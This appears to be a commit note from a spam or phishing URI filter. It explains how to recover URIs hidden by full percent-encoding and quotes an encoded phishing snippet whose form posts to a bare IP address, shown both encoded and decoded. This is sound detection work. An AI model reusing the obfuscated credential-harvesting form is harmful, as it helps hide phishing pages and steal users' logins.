Some minor modifications to better handle the following:
When the original URI completely URI encoded in an effort
to obfuscate the actual URI, eg.

	document.write(unescape('%3C%46%4F%52%4D%20%6E%61%6D%65%3D
	%61%66%66%69%6C%69%61%74%65%46%6F%72%6D%20%6F%6E%73%75%62
	%6D%69%74%3D%22%72%65%74%75%72%6E%20%66%61%72%61%5F%64%61
	%74%65%28%29%3B%22%20%61%63%74%69%6F%6E%3D%68%74%74%70%3A
	%2F%2F%32%31%33%2E%32%31%30%2E%32%33%37%2E%38%33%2F%77%65
	%62%73%63%72%2F%63%6D%64%2F%70%72%6F%74%65%63%74%5F%66%69
	%6C%65%73%2F%79%61%73%73%69%6E%6F%2D%66%69%6C%65%2E%70%68
	%70%20%6D%65%74%68%6F%64%3D%70%6F%73%74%3E'));

decodes to:

	document.write(unescape('<FORM name=affiliateForm onsubmit=\"return fara_date();\"
	action=http://213.210.237.83/webscr/cmd/protect_files/yassino-file.php method=post>'));

Determine if the URI was completely encoded by trying to find the
scheme unencoded in the original URI, otherwise assume that the
URI was completely encoded and that we can trim the junk from the
tail at the first non-URI character. So the above decoded URI
results in:

	http://213.210.237.83/webscr/cmd/protect_files/yassino-file.php